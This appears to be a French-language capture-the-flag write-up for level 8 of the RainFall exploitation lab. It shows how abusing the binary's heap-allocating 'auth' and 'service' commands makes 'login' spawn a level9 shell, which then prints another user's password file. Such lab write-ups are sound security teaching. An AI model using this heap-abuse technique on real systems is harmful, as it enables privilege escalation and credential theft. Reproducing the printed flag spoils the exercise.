# Level 8

En executant le binaire on voit que ce dernier lance un boucle infinit, en l'analisant dans cuter on peux voir que ce dernier nous permet d'entrer plusieur commande :
- auth
- service
- login
- reset

On essaie donc d'entrer ces commande dans le terminale. Grace a ca et a cutter on peut voir que le programme incremante deux variable globale (auth et service) via malloc voir commande ci dessous : 
`auth` initialise notre pointeur sur la variable _auth et a chaque fois que nous retapons la commande cette dernier s'incremante de 10.
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a018, (nil) 
auth 
0x804a028, (nil) 
auth 
0x804a038, (nil) 
```
`service` initialise la variable service et ajoute 10 par 10 la valeurs de la variable _service avec un strdup.
```
0x804a038, (nil) 
service 
0x804a038, 0x804a048 
service 
0x804a038, 0x804a058 
service 
0x804a038, 0x804a068 
```
`reset` free _auth mais continue a l'afficher car le pointer ne pas mis a `NULL` il suffit de lancer la commande 2 foi de suite pour voir un double free car ce dernier nest pas proteger.
```
reset
0x804a038, 0x804a068
reset
*** glibc detected *** ./level8: double free or corruption (fasttop): 0x0804a038 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
./level8[0x8048678]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 12376      /home/user/level8/level8
08049000-0804a000 rwxp 00000000 00:10 12376      /home/user/level8/level8
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
b7fd8000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
Aborted (core dumped)
```
et enfin `login` check dans la memoir si _auth + 32 est egale a 0, si ce n'est pas le cas elle printf password: sinon elle lance le /bin/sh du level9
```
login
Password:
0x804a028, (nil) 
```
Il faut donc init la variable `auth` et incrémente le `service` jusqu'a ce qu'il écrive a `auth + 32`.
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service 
0x804a008, 0x804a018 
service 
0x804a008, 0x804a028 
login 
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```